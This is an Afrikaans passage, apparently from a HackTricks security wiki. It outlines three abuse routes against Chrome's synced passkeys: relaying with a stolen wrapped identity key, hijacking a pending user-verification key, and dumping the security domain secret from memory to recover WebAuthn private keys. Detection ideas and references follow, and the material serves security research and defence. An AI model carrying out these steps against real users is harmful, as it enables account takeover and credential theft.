### Praktiese misbruikroetes

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Enumereer `WebauthnCredentialSpecifics` uit Chrome se LevelDB.
   - Begin ’n passkey-aanmelding en verkry ’n vars WebAuthn-challenge.
   - Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator-versoekbinding te onderteken.
   - Relay die teruggestuurde assertion na die relying party.
   - Dit is besonder waardevol wanneer die RP `userVerification=preferred` aanvaar of nie daarin slaag om assertions met **`UV=0`** te verwerp nie.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Dwing heraanboordneming af deur `passkey_enclave_state` te skrap of deur ’n geldige, ondertekende `device/forget`-bewerking te stuur.
   - As die aanboordneming die toestel in **`uv_key_pending`** laat, registreer ’n aanvallerbeheerde UV public key.
   - As die verskaffer nie attestation / secure-hardware-oorsprong vir die nuwe UV-key verifieer nie, word latere handtekeninge van die aanvallersleutel as **`UV=1`** behandel.
3. **Diefstal van master-secret / SDS-herstel**<sup>[[4]](#references)</sup>
   - Dwing herstel of heraansluiting af sodat Chrome die gesinkroniseerde-passkey-mastersecret ophaal.
   - Hou dop vir die herskepping/wysiging van `passkey_enclave_state`, en dump dan Chrome se geheue terwyl die plaintext **security domain secret (SDS)** daar teenwoordig is.
   - Gebruik die herwonne SDS om die geënkripteerde velde in elke `WebauthnCredentialSpecifics`-rekord te dekripteer en draagbare WebAuthn-private sleutels te herwin.

### DFIR / idees vir opsporing

- Monitor die **skrap/her-skepping** van `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Stel waarskuwings in vir abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur nie-blaaierprosesse.
- Stel waarskuwings in vir **Chrome-geheuedumps** of verdagte geheuetoegang tussen prosesse.
- Ondersoek herhaalde versoeke om ’n **Google Password Manager-herstel-PIN** of onverwagte heraanboordneming.
- Onthou dat WebAuthn se **`signCount`** dikwels nie nuttig is vir gesinkroniseerde passkeys nie, omdat dit konstant kan bly; klassieke kloonopsporing is dus swak.

## References

- [1] [Unit 42 – ’n Ondersoek na jare se onopgemerkte operasies wat hoëwaardesektore geteiken het](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-geloofsbriewe-dekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Binne Ink Dragon: onthulling van die relay-netwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: ’n Nuwe aanvalsoppervlak in wagwoordlose verifikasie](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-sleutelberging](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Hoe die Active Directory-databewaarplek werklik werk: binne NTDS.dit (Deel 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Afstandsdump van Lsass-wagwoorde](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho brei sy kuberspioenasie-arsenaal uit met die Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Die CreateFileW-funksie en `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B`-rugsteunmodus](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – beëindiging van aktiewe sessies](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
